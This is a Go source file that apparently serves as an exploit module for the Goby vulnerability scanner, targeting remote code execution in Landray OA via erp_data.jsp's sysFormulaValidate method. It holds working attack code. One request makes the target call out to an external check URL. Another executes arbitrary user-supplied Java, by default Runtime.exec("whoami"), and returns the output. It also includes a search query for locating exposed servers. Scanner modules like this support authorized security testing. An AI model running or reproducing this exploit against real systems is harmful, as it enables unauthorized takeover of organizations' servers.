package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Landray OA erp_data.jsp file sysFormulaValidate method RCE",
    "Description": "<p>Landray OA is a new generation of digital office platform, which comprehensively assists enterprises in online office, business collaboration and digital transformation.</p><p>Landray OA erp_data.jsp has security vulnerabilities, attackers can execute arbitrary script code to obtain server permissions.</p>",
    "Product": "Landray-OA",
    "Homepage": "http://www.landray.com.cn/",
    "DisclosureDate": "2022-08-30",
    "Author": "1209319263@qq.com",
    "FofaQuery": "(body=\"lui_login_message_td\" && body=\"form_bottom\") || (body=\"蓝凌软件 版权所有\" && (body=\"j_acegi_security_check\" || title=\"欢迎登录智慧协同平台\")) ||(body=\"j_acegi_security_check\" && body=\"onsubmit=\\\"return kmss_onsubmit();\" && (body=\"ExceptionTranslationFilter对SPRING_SECURITY_TARGET_URL 进行未登录url保持 请求中的hash并不会传递到服务端，故只能前端处理\" || body=\"kkDownloadLink link\"))",
    "GobyQuery": "(body=\"lui_login_message_td\" && body=\"form_bottom\") || (body=\"蓝凌软件 版权所有\" && (body=\"j_acegi_security_check\" || title=\"欢迎登录智慧协同平台\")) ||(body=\"j_acegi_security_check\" && body=\"onsubmit=\\\"return kmss_onsubmit();\" && (body=\"ExceptionTranslationFilter对SPRING_SECURITY_TARGET_URL 进行未登录url保持 请求中的hash并不会传递到服务端，故只能前端处理\" || body=\"kkDownloadLink link\"))",
    "Level": "2",
    "Impact": "<p>Landray OA erp_data.jsp has security vulnerabilities, attackers can execute arbitrary script code to obtain server permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released a patch, please pay attention to the official website update in time: <a href=\"https://www.landray.com.cn/\">https://www.landray.com.cn/</a></p>",
    "References": [
        "https://mp.weixin.qq.com/s/0xu7K726hp1xfnShhjGbVQ"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "javaCode",
            "type": "input",
            "value": "Runtime.getRuntime().exec(\"whoami\");",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "蓝凌 OA erp_data.jsp 文件 sysFormulaValidate 方法代码执行漏洞",
            "Product": "Landray-OA系统",
            "Description": "<p>蓝凌OA是新一代数字化办公平台，全面助力企业在线办公、业务协同和数字化转型。<br></p><p>蓝凌OA erp_data.jsp 存在安全漏洞，攻击者可执行任意脚本代码获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布补丁，请及时关注官网更新：<a href=\"https://www.landray.com.cn/\">https://www.landray.com.cn/</a><br></p>",
            "Impact": "<p>蓝凌OA erp_data.jsp 存在安全漏洞，攻击者可执行任意脚本代码获取服务器权限。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Landray OA erp_data.jsp file sysFormulaValidate method RCE",
            "Product": "Landray-OA",
            "Description": "<p>Landray OA is a new generation of digital office platform, which comprehensively assists enterprises in online office, business collaboration and digital transformation.<br></p><p>Landray OA erp_data.jsp has security vulnerabilities, attackers can execute arbitrary script code to obtain server permissions.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released a patch, please pay attention to the official website update in time: <a href=\"https://www.landray.com.cn/\">https://www.landray.com.cn/</a><br></p>",
            "Impact": "<p>Landray OA erp_data.jsp has security vulnerabilities, attackers can execute arbitrary script code to obtain server permissions.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`
	sendPayloadDJIOPQWUE := func(hostInfo *httpclient.FixUrl, payload string) (bool, string) {
		cfg1 := httpclient.NewPostRequestConfig("/sys/ui/extend/varkind/custom.jsp")
		cfg1.VerifyTls = false
		cfg1.FollowRedirect = false
		cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg1.Data = fmt.Sprintf(`var={"body":{"file":"/tic/core/resource/js/erp_data.jsp"}}&erpServcieName=sysFormulaValidate&script=%s`, url.PathEscape(payload))
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg1)
		if err != nil {
			return false, ""
		}
		return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `[{"message":"`), resp.Utf8Html
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			sendPayloadDJIOPQWUE(hostInfo, `HttpURLConnection connection = (HttpURLConnection)(new URL("`+checkUrl+`")).openConnection();connection.setRequestMethod("GET");connection.getResponseCode();`)
			return godclient.PullExists(checkStr, time.Second*15)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			javaCode := ss.Params["javaCode"].(string)
			status, respBody := sendPayloadDJIOPQWUE(expResult.HostInfo, javaCode)
			if status {
				expResult.Success = true
				expResult.Output = strings.ReplaceAll(respBody, "\r\n\r\n", "")
			}
			return expResult
		},
	))
}
